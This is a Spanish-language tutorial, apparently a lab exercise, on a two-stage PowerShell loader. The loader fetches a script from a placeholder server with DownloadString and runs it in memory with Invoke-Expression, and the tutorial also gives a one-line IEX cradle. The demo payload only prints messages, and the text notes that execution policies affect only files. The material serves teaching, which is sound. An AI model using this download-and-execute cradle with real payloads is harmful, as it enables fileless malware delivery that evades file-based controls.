
La idea será:

 Un **loader pequeño**

 Que descarga **texto**

 Y ese texto solo mostrará mensajes inocentes


Nada dañino.

---

# 🧪 Escenario de laboratorio (benigno)

Imagina que tienes un servidor web (o incluso un servidor local con Python).

En ese servidor existe este archivo:

## 📄 stage2.ps1  (payload final, inofensivo)

```powershell
Write-Host "Hola, soy el segundo script"
Write-Host "Me he ejecutado desde memoria"
Write-Host "No existo como archivo en el disco"
```

Este archivo **solo imprime texto**.

---

# 📄 stage1.ps1  (loader)

```powershell
$code = (New-Object Net.WebClient).DownloadString("http://servidor/stage2.ps1")
Invoke-Expression $code
```

---

# 🧠 Qué ocurre paso a paso

1. Ejecutas `stage1.ps1`
2. Descarga el contenido de `stage2.ps1`
3. Guarda ese contenido en `$code`
4. `Invoke-Expression` ejecuta ese texto
5. Aparecen los mensajes

---

# 🔁 Flujo visual

```
stage1.ps1
   |
   └─ descarga TEXTO de stage2.ps1
            |
            └─ ejecuta TEXTO
                    |
                    └─ Write-Host ...
```

---

# 🔍 Variante en una sola línea

```powershell
IEX (New-Object Net.WebClient).DownloadString("http://servidor/stage2.ps1")
```

Hace exactamente lo mismo que el ejemplo largo.

---

# 🧪 Prueba sin servidor (local)

Puedes simularlo así:

## Archivo payload.ps1

```powershell
Write-Host "Payload ejecutado desde memoria"
```

## Consola

```powershell
$code = Get-Content payload.ps1 -Raw
IEX $code
```

Mismo concepto, sin red.

---

# 🎯 Qué debes aprender de este ejercicio

* El archivo final nunca se ejecuta directamente
* Solo se ejecuta su **contenido**
* `Invoke-Expression` ejecuta texto
* Las políticas de ejecución solo afectan a archivos

---

# 🧠 Idea clave

Esto no es “magia hacker”.

Es simplemente:

**leer texto + ejecutar texto**

---

